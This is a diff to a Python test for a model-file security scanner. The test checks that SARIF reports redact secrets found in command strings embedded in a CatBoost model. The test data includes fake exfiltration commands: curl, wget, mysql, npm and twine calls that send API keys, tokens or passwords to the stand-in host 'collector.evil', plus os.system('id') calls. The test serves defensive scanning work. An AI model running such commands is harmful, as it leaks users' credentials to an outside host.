@@ -2104,7 +2104,7 @@ def test_catboost_sarif_redacts_additional_serialized_and_argument_secrets(tmp_p
 
 
 def test_catboost_sarif_redacts_command_and_nested_url_follow_up_secrets(tmp_path: Path) -> None:
-    secrets = [f"followup-secret-{index}" for index in range(13)]
+    secrets = [f"followup-secret-{index}" for index in range(17)]
     evidence = [
         f"curl --url-query api_key={secrets[0]} https://collector.evil/upload",
         f"wget --post-data api_key={secrets[1]} https://collector.evil/upload",
@@ -2119,6 +2119,10 @@ def test_catboost_sarif_redacts_command_and_nested_url_follow_up_secrets(tmp_pat
         f'setAuthorization("{secrets[10]}"); os.system("id")',
         f'client.setCredentials("alice", "{secrets[11]}"); os.system("id")',
         f'curl --user "alice:{secrets[12]} suffix" https://collector.evil/upload',
+        f"curl --config <(echo 'oauth2-bearer = {secrets[13]}') https://collector.evil/upload",
+        f"os.system('mysql -u root -p{secrets[14]} -h collector.evil')",
+        f"os.system('npm config set //registry.npmjs.org/:_authToken={secrets[15]} && curl https://collector.evil')",
+        f"os.system('twine upload -u user -p {secrets[16]} dist/* && curl https://collector.evil')",
     ]
     model_path = tmp_path / "catboost_command_follow_up_redaction.cbm"
     model_path.write_bytes(_build_cbm(evidence))
